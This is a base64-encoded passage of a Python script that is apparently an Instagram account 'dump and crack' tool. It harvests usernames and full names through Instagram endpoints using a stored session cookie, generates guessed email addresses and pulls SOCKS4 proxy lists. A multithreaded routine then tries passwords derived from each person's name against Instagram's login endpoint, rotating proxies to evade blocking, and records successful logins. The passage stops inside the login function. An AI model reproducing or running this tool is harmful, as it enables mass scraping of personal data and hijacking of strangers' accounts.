YWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19femFrWyd1c2VycyddOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelsndXNlcm5hbWUnXSsnPD0+Jyt6WydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH17elsndXNlcm5hbWUnXX08PT57elsnZnVsbF9uYW1lJ119IikKICAgICAgICAgICAgcHJpbnQoZiJcbntCfVt7UH0qe0J9XXtQfSBEb25lLi4uIikKICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9P3tCfV17UH0gRmlsZSBTYXZlZCBBdCA6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9QmFja3tNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRHVtcCBGYWlsZWQiKQogICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be0t9IXtQfV17S30gQ29ubmVjdGlvbiBFcnJvciIpCiMgRHVtcCBBY3Rpdml0eQpkZWYgX19fYWN0aXZpdHlfX18oKToKICAgIHRyeToKICAgICAgICBfX19maWxlID0gaW5wdXQoZiJcbntIfVt7UH0/e0h9XXtQfSBGaWxlIE5hbWUgOntLfSAiKS5yZXBsYWNlKCcgJywnXycpCiAgICAgICAgaWYgX19fZmlsZSBpbiBbJycsJyAnXToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBEb24ndCBFbXB0eSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIikKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2FjdGl2aXR5Lz9fX2E9MScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KQogICAgICAgICAgICBfX196YWsgPSByZS5maW5kYWxsKCcidXNlcm5hbWUiOiIoLio/KSIsImZ1bGxfbmFtZSI6IiguKj8pIiwnLCBfX19yb3oudGV4dCkKICAgICAgICAgICAgZm9yIHogaW4gX19femFrOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelswXSsnPD0+Jyt6WzFdKydcbicpCiAgICAgICAgICAgICAgICBwcmludChmInt6WzBdfTw9Pnt6WzFdfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gRG9uZS4uLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFNhdmVkIEF0IDp7S30gRHVtcC97X19fZmlsZX0iKQogICAgICAgICAgICBpbnB1dChmIntNfVt7UH1CYWNre019XXtQfSIpO19fX21lbnVfX18oKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0ge2V9IikKIyBEdW1wIEJlcmFuZGEKZGVmIF9fX2JlcmFuZGFfX18oKToKICAgIHRyeToKICAgICAgICBfX19maWxlID0gaW5wdXQoZiJcbntIfVt7UH0/e0h9XXtQfSBGaWxlIE5hbWUgOntLfSAiKS5yZXBsYWNlKCcgJywnXycpCiAgICAgICAgaWYgX19fZmlsZSBpbiBbJycsJyAnXToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBEb24ndCBFbXB0eSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIikKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZmVlZC9yZWVsc190cmF5LycsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19fcm96Wyd0cmF5J106CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6Wyd1c2VyJ11bJ3VzZXJuYW1lJ10rJzw9PicrelsndXNlciddWydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7elsndXNlciddWyd1c2VybmFtZSddfTw9Pnt6Wyd1c2VyJ11bJ2Z1bGxfbmFtZSddfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gRG9uZS4uLiIpCiAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT97Qn1de1B9IEZpbGUgU2F2ZWQgQXQ6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9QmFja3tNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRHVtcCBGYWlsZWQiKQogICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gQ29ubmVjdGlvbiBFcnJvciIpCiMgRHVtcCBIYXN0YWcKZGVmIF9fX2hhc3RhZ19fXygpOgogICAgdHJ5OgogICAgICAgIF9fX3RhZyA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gSGFzdGFnIDp7S30gIikucmVwbGFjZSgnIycsJycpCiAgICAgICAgaWYgX19fdGFnIGluIFsnJywnICddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IERvbid0IEVtcHR5IikKICAgICAgICBfX19maWxlID0gaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gRmlsZSBOYW1lIDp7S30gIikucmVwbGFjZSgnICcsJ18nKQogICAgICAgIGlmIF9fX2ZpbGUgaW4gWycnLCcgJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRG9uJ3QgRW1wdHkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie1B9ICIpCiAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vZXhwbG9yZS90YWdzL3tfX190YWd9Lz9fX2E9MScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KQogICAgICAgICAgICBfX196YWsgPSByZS5maW5kYWxsKCcidXNlcm5hbWUiOiIoLio/KSIsImZ1bGxfbmFtZSI6IiguKj8pIiwnLCBfX19yb3oudGV4dCkKICAgICAgICAgICAgZm9yIHogaW4gX19femFrOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelswXSsnPD0+Jyt6WzFdKydcbicpCiAgICAgICAgICAgICAgICBwcmludChmInt6WzBdfTw9Pnt6WzFdfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gRG9uZS5tLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFNhdmVkIEF0IDp7S30gRHVtcC97X19fZmlsZX0iKQogICAgICAgICAgICBpbnB1dChmIntNfVt7UH1CYWNre019XXtQfSIpO19fX21lbnVfX18oKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0ge2V9IikKIyBEdW1wIFNlYXJjaApkZWYgX19fc2VhcmNoX19fKCk6CiAgICB0cnk6CiAgICAgICAgX19fdXNlciA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gVXNlciA6e0t9ICIpCiAgICAgICAgaWYgX19fdXNlcls6MV0gaW4gWycxJywnMicsJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcwJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gVXNlIFVzZXJuYW1lIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3tfX191c2VyfS8/X19hPTEnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkuanNvbigpWydncmFwaHFsJ11bJ3VzZXInXQogICAgICAgICAgICBwcmludChmIntIfVt7UH0/e0h9XXtQfSBOYW1lIDp7S30ge19fX3JvelsnZnVsbF9uYW1lJ119XG4iKQogICAgICAgICAgICBfX19maWxlID0gKF9fX3JvelsnZnVsbF9uYW1lJ10ucmVwbGFjZSgnICcsJ18nKSsnLnR4dCcpCiAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgogICAgICAgICAgICBfX196YWsgPSBzZXMuZ2V0KGYnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2Zic2VhcmNoL2FjY291bnRzX3JlY3MvP3RhcmdldF91c2VyX2lkPXtfX19yb3pbImlkIl19JmluY2x1ZGVfZnJpZW5kc2hpcF9zdGF0dXM9dHJ1ZScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19femFrWyd1c2VycyddOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelsndXNlcm5hbWUnXSsnPD0+Jyt6WydmdWxsX25hbWUnXSsnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH17elsndXNlcm5hbWUnXX08PT57elsnZnVsbF9uYW1lJ119IikKICAgICAgICAgICAgcHJpbnQoZiJcbntIfVt7UH0qe0h9XXtQfSBEb25lLi4uIikKICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9P3tIfV17UH0gRmlsZSBTYXZlZCBBdCA6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9QmFja3tNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRHVtcCBGYWlsZWQiKQogICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be0t9IXtQfV17S30gQ29ubmVjdGlvbiBFcnJvciIpCiMgRHVtcCBRdWVyeQpkZWYgX19fcXVlcnlfX18oKToKICAgIHRyeToKICAgICAgICBfX19xdWVyeSA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gUXVlcnkgOntLfSAiKQogICAgICAgIGlmIF9fX3F1ZXJ5IGluIFsnJywnICddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IERvbid0IEVtcHR5IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIntQfSAiKQogICAgICAgICAgICBfX19maWxlID0gX19fcXVlcnkucmVwbGFjZSgnICcsJ18nKSsnLnR4dCcKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS93ZWIvc2VhcmNoL3RvcHNlYXJjaC8/Y29udGV4dD1ibGVuZGVkJnF1ZXJ5PXtfX19xdWVyeX0mcmFua190b2tlbj0wLjM5NTM1OTIzMTgyNzA4OTMmY291bnQ9NTAwMCcsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKCkKICAgICAgICAgICAgZm9yIHogaW4gX19fcm96Wyd1c2VycyddOgogICAgICAgICAgICAgICAgb3BlbignRHVtcC8nK19fX2ZpbGUsICdhJykud3JpdGUoelsndXNlciddWyd1c2VybmFtZSddKyc8PT4nK3pbJ3VzZXInXVsnZnVsbF9uYW1lJ10rJ1xuJykKICAgICAgICAgICAgICAgIHByaW50KGYie3pbJ3VzZXInXVsndXNlcm5hbWUnXX08PT57elsndXNlciddWydmdWxsX25hbWUnXX0iKQogICAgICAgICAgICBwcmludChmIlxue0J9W3tQfSp7Qn1de1B9IERvbmUuLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFNhdmVkIEF0IDp7S30gRHVtcC97X19fZmlsZX0iKQogICAgICAgICAgICBpbnB1dChmIntNfVt7UH1CYWNre019XXtQfSIpO19fX21lbnVfX18oKQogICAgZXhjZXB0IChLZXlFcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBEdW1wIEZhaWxlZCIpCiAgICBleGNlcHQgKENvbm5lY3Rpb25FcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7S30he1B9XXtLfSBDb25uZWN0aW9uIEVycm9yIikKIyBEdW1wIERhcmkgRW1haWwKZGVmIF9fX2VtYWlsX19fKCk6CiAgICB0cnk6CiAgICAgICAgX19fbmFtYSA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gTmFtZSA6e0t9ICIpLnJlcGxhY2UoJyAnLCcnKQogICAgICAgIGlmIF9fX25hbWEgaW4gWycnLCcgJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRG9uJ3QgRW1wdHkiKQogICAgICAgIF9fX2RvbWFpbiA9IGlucHV0KGYie0h9W3tQfT97SH1de1B9IERvbWFpbiA6e0t9ICIpCiAgICAgICAgaWYgX19fZG9tYWluIGluIFsnQGdtYWlsLmNvbScsJ0B5YWhvby5jb20nLCdAaG90bWFpbC5jb20nLCdAZW1haWwuY29tJywnQG1haWwuY29tJywnQG91dGxvb2suY29tJywnQHlhbmRleC5jb20nXToKICAgICAgICAgICAgX19fbGltaXQgPSBpbnQoaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gTGltaXQgOntLfSAiKSkKICAgICAgICAgICAgaWYgX19fbGltaXQgPj0xMDAxOgogICAgICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBNYXhpbXVtIDEwMDAiKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIikKICAgICAgICAgICAgICAgIF9fX2ZpbGUgPSAnRHVtcC8nK19fX25hbWErJy50eHQnCiAgICAgICAgICAgICAgICBmb3IgXyBpbiByYW5nZShfX19saW1pdCk6CiAgICAgICAgICAgICAgICAgICAgX19fbm9tb3IgPSByYW5kb20ucmFuZGludCgxLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgX19fdXNlciA9IF9fX25hbWEgKyBzdHIoX19fbm9tb3IpICsgX19fZG9tYWluICsgJzw9PicgKyBfX19uYW1hICsgJyAnICsgc3RyKF9fX25vbW9yKQogICAgICAgICAgICAgICAgICAgIG9wZW4oX19fZmlsZSwgJ2EnKS53cml0ZShmJ3tfX191c2VyfVxuJykKICAgICAgICAgICAgICAgICAgICBwcmludChmIntfX191c2VyfSIpCiAgICAgICAgICAgICAgICBwcmludChmIlxue0J9W3tQfSp7Qn1de1B9IERvbmUuLi4iKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9P3tCfV17UH0gRmlsZSBTYXZlZCBBdCA6e0t9IHtfX19maWxlfSIpCiAgICAgICAgICAgICAgICBpbnB1dChmIntNfVt7UH1CYWNre019XXtQfSIpO19fX21lbnVfX18oKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRG9tYWluICdAZ21haWwuY29tJywnQHlhaG9vLmNvbScsJ0Bob3RtYWlsLmNvbScsJ0BlbWFpbC5jb20nLCdAbWFpbC5jb20nLCdAb3V0bG9vay5jb20nLCdAeWFuZGV4LmNvbSciKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0ge2V9IikKIyBQcm94eQpkZWYgX19fcHJveHlfX18oKToKICAgIHRyeToKICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLnByb3h5c2NyYXBlLmNvbS92Mi8/cmVxdWVzdD1kaXNwbGF5cHJveGllcyZwcm90b2NvbD1zb2NrczQmdGltZW91dD0xMDAwMDAmY291bnRyeT1hbGwmc3NsPWFsbCZhbm9ueW1pdHk9YWxsJykudGV4dAogICAgICAgIG9wZW4oJ0RhdGEvcHJveHkudHh0JywgJ3cnKS53cml0ZShfX19yb3opCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQXJ5YW4tTWZjL01BWC9tYWluL0RhdGEvcHJveHkyLnR4dCcpLnRleHQKICAgICAgICBvcGVuKCdEYXRhL3Byb3h5LnR4dCcsICd3Jykud3JpdGUoX19fcm96KQogICAgX19fY3JhY2tfX18oKQojIENyYWNrCmNsYXNzIF9fX2NyYWNrX19fOgogICAgCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5raWxsID0gMAogICAgICAgIHNlbGYub2sgPSBbXQogICAgICAgIHNlbGYuY3AgPSBbXQogICAgICAgIHByaW50KGYiXG57SH1be1B9MXtIfV17UH0gVXNlIFBhc3N3b3JkIHtIfVt7S31uYW1lLCBuYW1lMTIzLCBuYW1lMTIzNDV7SH1de0t9IikKICAgICAgICBwcmludChmIntIfVt7UH0ye0h9XXtQfSBVc2UgUGFzc3dvcmQge0h9W3tLfW5hbWUsIG5hbWUxMjMsIG5hbWUxMjM0LCBuYW1lMTIzNDV7SH1de0t9IikKICAgICAgICBwcmludChmIntIfVt7UH0ze0h9XXtQfSBVc2UgUGFzc3dvcmQge0h9W3tLfW5hbWUsIG5hbWUxMjMsIG5hbWUxMjM0LCBuYW1lMTIzNDUsIG5hbWUxMjM0NTZ7SH1de0t9IikKICAgICAgICBwcmludChmIntIfVt7UH00e0h9XXtQfSBVc2UgUGFzc3dvcmQgTWFudWFsIHtIfVt7S30+NXtIfV17S31cbiIpCiAgICAgICAgX19fcGlsaWggPSBpbnB1dChmIntCfVt7UH0/e0J9XXtQfSBTZWxlY3QgOntIfSAiKQogICAgICAgIGlmIF9fX3BpbGloIGluIFsnNCcsJzA0J106CiAgICAgICAgICAgIHB3eCA9IGlucHV0KGYie0J9W3tQfT97Qn1de1B9IFBhc3N3b3JkIDp7SH0gIikuc3BsaXQoJywnKQogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5fX19kdW1wID0gaW5wdXQoZiJ7Qn1be1B9P3tCfV17UH0gRmlsZSBEdW1wIDp7SH0gIikKICAgICAgICAgICAgc2VsZi5fX19maWxlID0gb3BlbihzZWxmLl9fX2R1bXAsICdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCAoSU9FcnJvcik6CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRmlsZSBEb2VzIE5vdCBFeGl0IikKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50KGYiXG57SH1be1B94oCie0h9XXtQfSBPayBSZXN1bHRzIFNhdmVkIGluIFJlc3VsdHMvT2sudHh0IikKICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B94oCie0h9XXtQfSBDUCBSZXN1bHRzIFN0b3JlZCBpbiBSZXN1bHRzL0NwLnR4dFxuIikKICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIChfX19oYXl1ayk6CiAgICAgICAgICAgICAgICBmb3IgX19fdXNlciBpbiBzZWxmLl9fX2ZpbGU6CiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUsIG5hbWEgPSBfX191c2VyLnNwbGl0KCc8PT4nKQogICAgICAgICAgICAgICAgICAgIHogPSBuYW1hLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICBpZiBfX19waWxpaCBpbiBbJzEnLCcwMSddOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IFtuYW1hLnJlcGxhY2UoJyAnLCcnKSwgbmFtYSwgelswXSsnMTIzJywgelswXSsnMTIzNDUnXQogICAgICAgICAgICAgICAgICAgIGVsaWYgX19fcGlsaWggaW4gWycyJywnMDInXToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBbbmFtYS5yZXBsYWNlKCcgJywnJyksIG5hbWEsIHpbMF0rJzEyMycsIHpbMF0rJzEyMzQnLCB6WzBdKycxMjM0NSddCiAgICAgICAgICAgICAgICAgICAgZWxpZiBfX19waWxpaCBpbiBbJzMnLCcwMyddOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IFtuYW1hLnJlcGxhY2UoJyAnLCcnKSwgbmFtYSwgelswXSsnMTIzJywgelswXSsnMTIzNCcsIHpbMF0rJzEyMzQ1JywgelswXSsnMTIzNDU2J10KICAgICAgICAgICAgICAgICAgICBlbGlmIF9fX3BpbGloIGluIFsnNCcsJzA0J106CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gcHd4CiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBbbmFtYS5yZXBsYWNlKCcgJywnJyksIG5hbWEsIHpbMF0rJzEyMycsIHpbMF0rJzEyMzQnLCB6WzBdKycxMjM0NSddCiAgICAgICAgICAgICAgICAgICAgX19faGF5dWsuc3VibWl0KHNlbGYuX19tYWluX18sIHNlbGYuX19fZmlsZSwgdXNlcm5hbWUsIHBhc3N3b3JkKQogICAgICAgICAgICBleGl0KGYiXG57TX1be1B9RmluaXNoe019XXtQfSIpCiAgICAgICAgZXhjZXB0IChWYWx1ZUVycm9yKToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBDcmFjayBDb21wbGV0ZWQgTG9va3MgTGlrZSBTb21ldGhpbmcgRXJyb3IgUGxlYXNlIER1bXAgQWdhaW4hIikKICAgIGRlZiBfX21haW5fXyhzZWxmLCB1c2VyLCB1aWQsIHB3eCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBfX191c2VyYWdlbnQgPSBvcGVuKCdEYXRhL3VhLnR4dCcsICdyJykucmVhZCgpCiAgICAgICAgZXhjZXB0IChJT0Vycm9yKToKICAgICAgICAgICAgX19fdXNlcmFnZW50ID0gKCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82MC4wLjMxMTIuMTE2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JykKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBwd3g6CiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkKICAgICAgICAgICAgICAgIF9fX3VybCA9ICgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nKQogICAgICAgICAgICAgICAgX19fbG9naW4gPSAoJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vYWpheC8nKQogICAgICAgICAgICAgICAgX19fcHJveHkgPSB7J2h0dHAnOiAnc29ja3M0Oi8vJXMnJShyYW5kb20uY2hvaWNlKG9wZW4oIkRhdGEvcHJveHkudHh0IiwiciIpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKX0KICAgICAgICAgICAgICAgIF9fX2NzcmYgPSByZXF1ZXN0cy5nZXQoX19fdXJsKS5jb29raWVzWydjc3JmdG9r